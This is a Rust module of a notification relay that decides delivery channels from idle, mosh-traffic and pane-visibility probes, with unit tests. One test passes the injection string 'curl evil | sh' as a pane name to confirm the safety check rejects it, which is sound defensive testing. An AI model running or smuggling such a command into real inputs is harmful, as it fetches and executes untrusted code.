//! The engine: one event in, a delivery plan out, every decision delegated.
//!
//! This module ORCHESTRATES the decision core against the probe seams; it
//! owns no policy of its own. Two properties are load-bearing and pinned by
//! recording probes rather than by outcomes alone:
//!
//! PROBES RUN ONLY WHEN THEIR ANSWER COULD MATTER. The idle probe is an
//! unbounded pipe on a path that must never stall; a caller that already
//! decided the phone leg (narrowing flags, skip, force, an idle override)
//! must not pay for a reading it cannot use. The attention probes are
//! confined to the one band where they can change the verdict, and the
//! one-second viewing sample runs only when the panes already match.
//!
//! CALLER INTENT IS NEVER OVERRIDDEN. Skip beats force ("I already sent it"
//! is more specific than an override), the narrowing flags beat both, and
//! force exempts the event from viewed-pane suppression.

use std::collections::BTreeMap;

use crate::probes::{IdleProbe, MoshRateProbe, PhoneMarkerProbe, SessionViewProbe};
use crate::registry::Selection;
use crate::routing::Leg;
use crate::surface::{Surface, Visibility};

/// The idle threshold the bash defaults to when `RELAY_DESK_IDLE_SECS` says
/// nothing: past this the operator counts as away from the desk.
pub const DEFAULT_DESK_IDLE_SECS: u64 = 120;

/// Everything the environment may override, parsed once at the edge.
/// Garbage numeric values read as absent, never as zero.
#[derive(Debug, Default, PartialEq)]
pub struct Overrides {
    pub idle_secs: Option<u64>,
    pub desk_idle_secs: Option<u64>,
    pub skip_phone: bool,
    pub force_phone: bool,
    pub moshi_viewing: Option<bool>,
    pub attention_floor_bytes: Option<u64>,
    /// Set when the variable was PRESENT and non-empty but not a count. The
    /// bash validators reject such a value outright rather than falling back,
    /// and the fallback is what would turn an unknown into a confident
    /// number: a probe reading where the caller overrode it, or a default
    /// threshold where the caller's was garbled.
    pub idle_invalid: bool,
    pub desk_invalid: bool,
}

impl Overrides {
    /// Parse the RELAY_* and PNS_* variables out of an environment map.
    pub fn from_env(vars: &BTreeMap<String, String>) -> Self {
        // A present-but-garbled value is reported alongside the None, so the
        // caller can refuse it rather than fall back to a default.
        let read = |key: &str| match vars.get(key).filter(|raw| !raw.is_empty()) {
            None => (None, false),
            Some(raw) => {
                let parsed = crate::parse_count(raw);
                (parsed, parsed.is_none())
            }
        };
        let count = |key: &str| read(key).0;
        let set = |key: &str| vars.get(key).is_some_and(|raw| !raw.is_empty());
        let forced = |key: &str| match vars.get(key).map(String::as_str) {
            Some("1") => Some(true),
            Some("0") => Some(false),
            _ => None,
        };
        let (idle_secs, idle_invalid) = read("RELAY_IDLE_SECS");
        let (desk_idle_secs, desk_invalid) = read("RELAY_DESK_IDLE_SECS");
        Self {
            idle_secs,
            desk_idle_secs,
            skip_phone: set("RELAY_SKIP_PHONE"),
            force_phone: set("RELAY_FORCE_PHONE"),
            moshi_viewing: forced("RELAY_MOSHI_VIEWING"),
            // The floor alone keeps the plain fallback: bash reads it with
            // the same `${VAR:-100}` and never validates it separately.
            attention_floor_bytes: count("PNS_ATTENTION_FLOOR_BYTES"),
            idle_invalid,
            desk_invalid,
        }
    }
}

/// What the engine decided for one event.
#[derive(Debug, PartialEq)]
pub struct Decision {
    /// The legs to dispatch, in delivery order.
    pub legs: Vec<Leg>,
    /// The lights signal, which rides on top of every long-running event
    /// rather than being a leg of its own.
    pub pulse: bool,
    /// The pane was dropped from the event because it failed the safety
    /// check; the caller prints the one warning.
    pub pane_dropped: bool,
}

/// Decide the plan for one event. `now_secs` is the wall clock, taken once at
/// the edge; `None` reads as an unreadable clock, which ages nothing.
///
/// ASSEMBLY ONLY. Where the operator is looking is `surface::surface`, whether
/// the origin pane is on screen is `surface::visibility`, and what to do about
/// it is `surface::plan`. This reads the probes those three need and turns the
/// plan into legs.
#[allow(clippy::too_many_arguments)]
pub fn decide<P>(
    probes: &P,
    selection: &Selection,
    overrides: &Overrides,
    local_only: bool,
    remote_only: bool,
    pane: &str,
    now_secs: Option<u64>,
    long_running: bool,
    mobile_watch_card: bool,
) -> Decision
where
    P: IdleProbe + PhoneMarkerProbe + MoshRateProbe + SessionViewProbe,
{
    let delivery = crate::surface::plan(
        operator_surface(probes, overrides, now_secs),
        operator_visibility(probes, pane),
        long_running,
        mobile_watch_card,
    );
    // The two caller overrides survive the arbitration they used to steer:
    // skip beats force, and both beat the surface.
    let delivery = crate::surface::DeliveryPlan {
        phone_card: !overrides.skip_phone && (overrides.force_phone || delivery.phone_card),
        ..delivery
    };

    Decision {
        legs: crate::routing::channel_plan(selection, local_only, remote_only, delivery),
        pane_dropped: !pane.is_empty() && !crate::safety::pane_is_safe(pane),
        pulse: delivery.pulse,
    }
}

/// Where the operator is, from the three readings the arbitration needs.
///
/// Public because the blocking hook asks the same question for a different
/// reason: whether the operator can answer from the phone at all.
///
/// EVERY READING IS GUARDED by the verdict that would discard it: a caller who
/// already stated the answer never pays for the probe underneath it, and the
/// rate sample costs a full second of live counters.
pub fn operator_surface<P>(probes: &P, overrides: &Overrides, now_secs: Option<u64>) -> Surface
where
    P: IdleProbe + PhoneMarkerProbe + MoshRateProbe,
{
    // A garbled threshold is UNKNOWN, never the default: substituting 120
    // would read a stale desk as fresh and hold the operator at their desk.
    let desk_fresh_secs = if overrides.desk_invalid {
        None
    } else {
        Some(overrides.desk_idle_secs.unwrap_or(DEFAULT_DESK_IDLE_SECS))
    };
    let Some(desk_fresh_secs) = desk_fresh_secs else {
        return Surface::Away;
    };

    let streaming = match overrides.moshi_viewing {
        Some(forced) => forced,
        None => probes.sample_csv().is_some_and(|csv| {
            crate::presence::mosh_rate_active(
                &csv,
                overrides
                    .attention_floor_bytes
                    .unwrap_or(crate::presence::DEFAULT_ATTENTION_FLOOR_BYTES),
            )
        }),
    };
    if streaming {
        return Surface::Mobile;
    }

    let desk_input_age = if overrides.idle_invalid {
        None
    } else {
        match overrides.idle_secs {
            Some(secs) => Some(secs),
            None => probes.idle_secs(),
        }
    };
    // The marker's AGE, not its timestamp: an unreadable clock ages nothing,
    // which drops the tap out of the arbitration rather than making it
    // infinitely fresh.
    let marker_age = now_secs.and_then(|now| Some(now.saturating_sub(probes.marker_mtime_secs()?)));
    crate::surface::surface(desk_input_age, marker_age, false, desk_fresh_secs)
}

/// Whether the origin pane is on screen. An unreadable view is Unknown, which
/// never suppresses.
fn operator_visibility<P: SessionViewProbe>(probes: &P, pane: &str) -> Visibility {
    if pane.is_empty() {
        return Visibility::Unknown;
    }
    match probes.session_view(pane) {
        Some(view) => crate::surface::visibility(pane, &view),
        None => Visibility::Unknown,
    }
}

#[cfg(test)]
mod tests {
    use super::{Decision, Overrides, decide};
    use crate::config::parse_config;
    use crate::probes::{IdleProbe, MoshRateProbe, PhoneMarkerProbe, SessionViewProbe};
    use crate::registry::Selection;
    use crate::surface::SessionView;
    use std::cell::Cell;
    use std::collections::BTreeMap;

    /// Recording probes: every reading is counted, so a test can pin that a
    /// probe was never consulted, not only what the verdict was.
    #[derive(Default)]
    struct CountingProbes {
        idle: Option<u64>,
        marker_mtime: Option<u64>,
        sample: Option<String>,
        view: Option<SessionView>,
        idle_reads: Cell<u32>,
        marker_reads: Cell<u32>,
        sample_reads: Cell<u32>,
        view_reads: Cell<u32>,
    }

    impl IdleProbe for CountingProbes {
        fn idle_secs(&self) -> Option<u64> {
            self.idle_reads.set(self.idle_reads.get() + 1);
            self.idle
        }
    }
    impl PhoneMarkerProbe for CountingProbes {
        fn marker_mtime_secs(&self) -> Option<u64> {
            self.marker_reads.set(self.marker_reads.get() + 1);
            self.marker_mtime
        }
    }
    impl MoshRateProbe for CountingProbes {
        fn sample_csv(&self) -> Option<String> {
            self.sample_reads.set(self.sample_reads.get() + 1);
            self.sample.clone()
        }
    }
    impl SessionViewProbe for CountingProbes {
        fn session_view(&self, _origin_pane: &str) -> Option<SessionView> {
            self.view_reads.set(self.view_reads.get() + 1);
            self.view.clone()
        }
    }

    /// A view in which the origin pane is on screen, unzoomed.
    fn watching(origin: &str) -> SessionView {
        SessionView {
            origin_tab: "t1".to_string(),
            focused_tab: "t1".to_string(),
            focused_pane: origin.to_string(),
            panes_in_focused_tab: vec![origin.to_string()],
            zoomed: false,
        }
    }

    /// A view in which the origin pane's tab is not the one on screen.
    fn elsewhere(_origin: &str) -> SessionView {
        SessionView {
            origin_tab: "t1".to_string(),
            focused_tab: "t2".to_string(),
            focused_pane: "t2:p9".to_string(),
            panes_in_focused_tab: vec!["t2:p9".to_string()],
            zoomed: false,
        }
    }

    fn three_selection() -> Selection {
        crate::registry::test_roster()
            .enabled(
                &parse_config(
                    "[plugins.moshi]\nenabled = true\n[plugins.hermes]\nenabled = true\n[plugins.macos-banner]\nenabled = true\n",
                )
                .unwrap(),
            )
            .unwrap()
    }

    fn names(decision: &Decision) -> Vec<&str> {
        decision.legs.iter().map(|leg| leg.name).collect()
    }

    /// One event through the whole engine, with the readings a test cares
    /// about and defaults for the rest.
    fn decide_with(probes: &CountingProbes, overrides: &Overrides, pane: &str) -> Decision {
        decide(
            probes,
            &three_selection(),
            overrides,
            false,
            false,
            pane,
            Some(1_000_000),
            false,
            false,
        )
    }

    // --- the plan drives the legs -------------------------------------------

    #[test]
    fn every_surface_and_visibility_pair_dispatches_the_legs_its_row_planned() {
        // The engine's half of the matrix: the model decides banner and card,
        // and these are the LEGS that come out of it. hermes is the durable
        // log and rides every row, which is what makes the other two the
        // observable difference.
        // (label, desk input age, session view, the legs it must dispatch)
        type Case = (
            &'static str,
            Option<u64>,
            Option<SessionView>,
            Vec<&'static str>,
        );
        let matrix: [Case; 5] = [
            (
                "at the desk watching the pane: log only",
                Some(2),
                Some(watching("wW:p1")),
                vec!["hermes"],
            ),
            (
                "at the desk, pane on another tab: banner",
                Some(2),
                Some(elsewhere("wW:p1")),
                vec!["hermes", "macos-banner"],
            ),
            (
                "at the desk, view unreadable: banner, never suppressed on doubt",
                Some(2),
                None,
                vec!["hermes", "macos-banner"],
            ),
            (
                "away, pane on screen: the card still fires",
                Some(9_000),
                Some(watching("wW:p1")),
                vec!["moshi", "hermes"],
            ),
            (
                "away, pane hidden: card, and no banner for an empty room",
                Some(9_000),
                Some(elsewhere("wW:p1")),
                vec!["moshi", "hermes"],
            ),
        ];
        for (label, idle, view, expected) in matrix {
            let probes = CountingProbes {
                idle,
                view,
                ..CountingProbes::default()
            };
            assert_eq!(
                names(&decide_with(&probes, &Overrides::default(), "wW:p1")),
                expected,
                "case: {label}"
            );
        }
    }

    #[test]
    fn a_streaming_phone_never_gets_a_banner_however_fresh_the_desk_looks() {
        // The property the matrix rests on: terminal-notifier is a desk
        // surface, and mobile is not the desk.
        let probes = CountingProbes {
            idle: Some(1),
            sample: Some(
                "01:00:00,mosh-server.1,,,1000,0\n01:00:01,mosh-server.1,,,9000,0\n".to_string(),
            ),
            view: Some(elsewhere("wW:p1")),
            ..CountingProbes::default()
        };
        let decision = decide_with(&probes, &Overrides::default(), "wW:p1");
        let legs = names(&decision);
        assert!(!legs.contains(&"macos-banner"), "got {legs:?}");
        assert!(legs.contains(&"moshi"), "got {legs:?}");
    }

    #[test]
    fn the_long_running_tier_pulses_and_says_so_in_the_decision() {
        let probes = CountingProbes {
            idle: Some(2),
            view: Some(watching("wW:p1")),
            ..CountingProbes::default()
        };
        let decision = decide(
            &probes,
            &three_selection(),
            &Overrides::default(),
            false,
            false,
            "wW:p1",
            Some(1_000_000),
            true,
            false,
        );
        assert!(decision.pulse, "the lights ride on top of every long event");
        assert_eq!(
            names(&decision),
            vec!["hermes"],
            "and change nothing else about a watched desk pane"
        );
    }

    #[test]
    fn the_mobile_watch_card_toggle_adds_the_card_only_when_it_is_on() {
        let streaming = || CountingProbes {
            idle: Some(9_000),
            sample: Some(
                "01:00:00,mosh-server.1,,,1000,0\n01:00:01,mosh-server.1,,,9000,0\n".to_string(),
            ),
            view: Some(watching("wW:p1")),
            ..CountingProbes::default()
        };
        let with_toggle = |on: bool| {
            let probes = streaming();
            let decision: Decision = decide(
                &probes,
                &three_selection(),
                &Overrides::default(),
                false,
                false,
                "wW:p1",
                Some(1_000_000),
                true,
                on,
            );
            decision.legs.iter().any(|leg| leg.name == "moshi")
        };
        assert!(!with_toggle(false), "default off: the pulse says it alone");
        assert!(with_toggle(true), "on: the card joins the pulse");
    }

    // --- caller intent ------------------------------------------------------

    #[test]
    fn skip_phone_beats_force_phone_because_already_sent_is_more_specific() {
        let probes = CountingProbes::default();
        let overrides = Overrides {
            skip_phone: true,
            force_phone: true,
            ..Overrides::default()
        };
        assert!(!names(&decide_with(&probes, &overrides, "")).contains(&"moshi"));
    }

    #[test]
    fn force_phone_sends_the_card_from_the_desk_with_the_pane_in_plain_sight() {
        // The override outranks the surface entirely, which is what moshi-gate
        // and the hooks rely on.
        let probes = CountingProbes {
            idle: Some(1),
            view: Some(watching("wW:p1")),
            ..CountingProbes::default()
        };
        let overrides = Overrides {
            force_phone: true,
            ..Overrides::default()
        };
        assert!(names(&decide_with(&probes, &overrides, "wW:p1")).contains(&"moshi"));
    }

    #[test]
    fn a_forced_streaming_verdict_spares_the_one_second_sample() {
        // The rate sample costs a full second of live counters, so a caller
        // who already stated the answer must never pay for it.
        let probes = CountingProbes {
            idle: Some(9_000),
            ..CountingProbes::default()
        };
        let overrides = Overrides {
            moshi_viewing: Some(true),
            ..Overrides::default()
        };
        decide_with(&probes, &overrides, "wW:p1");
        assert_eq!(probes.sample_reads.get(), 0);
    }

    #[test]
    fn an_overridden_idle_reading_spares_the_idle_probe() {
        let probes = CountingProbes {
            idle: Some(5),
            ..CountingProbes::default()
        };
        let overrides = Overrides {
            idle_secs: Some(9_000),
            ..Overrides::default()
        };
        decide_with(&probes, &overrides, "");
        assert_eq!(probes.idle_reads.get(), 0);
    }

    #[test]
    fn an_unreadable_clock_ages_no_marker_rather_than_treating_it_as_fresh() {
        // Without a clock the tap has no age, so it drops out of the
        // arbitration instead of counting as the newest signal forever.
        let probes = CountingProbes {
            idle: Some(9_000),
            marker_mtime: Some(999_990),
            ..CountingProbes::default()
        };
        let decision = decide(
            &probes,
            &three_selection(),
            &Overrides::default(),
            false,
            false,
            "",
            None,
            false,
            false,
        );
        assert!(
            names(&decision).contains(&"moshi"),
            "away still cards; the tap simply did not decide it"
        );
    }

    // --- pane safety --------------------------------------------------------

    #[test]
    fn an_unsafe_pane_is_dropped_once_for_every_channel() {
        let probes = CountingProbes {
            idle: Some(900),
            ..CountingProbes::default()
        };
        assert!(decide_with(&probes, &Overrides::default(), "wW:p21; curl evil | sh").pane_dropped);
    }

    #[test]
    fn a_safe_pane_is_not_dropped() {
        let probes = CountingProbes {
            idle: Some(900),
            ..CountingProbes::default()
        };
        assert!(!decide_with(&probes, &Overrides::default(), "wW:p21").pane_dropped);
    }

    // --- overrides parsing --------------------------------------------------

    #[test]
    fn a_garbage_idle_override_is_unknown_without_a_probe_read() {
        // Bash keeps a non-empty override and never runs the probe. Falling
        // back to the probe would both pay the read and let a live reading
        // hold the operator at a desk the override said nothing about.
        let vars = BTreeMap::from([("RELAY_IDLE_SECS".to_string(), "not-a-number".to_string())]);
        let overrides = Overrides::from_env(&vars);
        let probes = CountingProbes {
            idle: Some(5),
            ..CountingProbes::default()
        };
        let decision = decide_with(&probes, &overrides, "");
        assert_eq!(probes.idle_reads.get(), 0);
        assert!(
            names(&decision).contains(&"moshi"),
            "an unknown desk reading falls toward away, which cards"
        );
    }

    #[test]
    fn a_garbage_desk_threshold_fails_toward_away_never_into_the_default() {
        // Substituting the default would read a stale desk as fresh and hold
        // the operator at a desk they are not at.
        let vars = BTreeMap::from([("RELAY_DESK_IDLE_SECS".to_string(), "0600".to_string())]);
        let overrides = Overrides::from_env(&vars);
        let probes = CountingProbes {
            idle: Some(5),
            ..CountingProbes::default()
        };
        let decision = decide_with(&probes, &overrides, "");
        assert!(names(&decision).contains(&"moshi"));
    }

    #[test]
    fn skip_and_force_parse_from_their_relay_variables() {
        let vars = BTreeMap::from([
            ("RELAY_SKIP_PHONE".to_string(), "1".to_string()),
            ("RELAY_FORCE_PHONE".to_string(), "1".to_string()),
        ]);
        let overrides = Overrides::from_env(&vars);
        assert!(overrides.skip_phone);
        assert!(overrides.force_phone);
    }
}
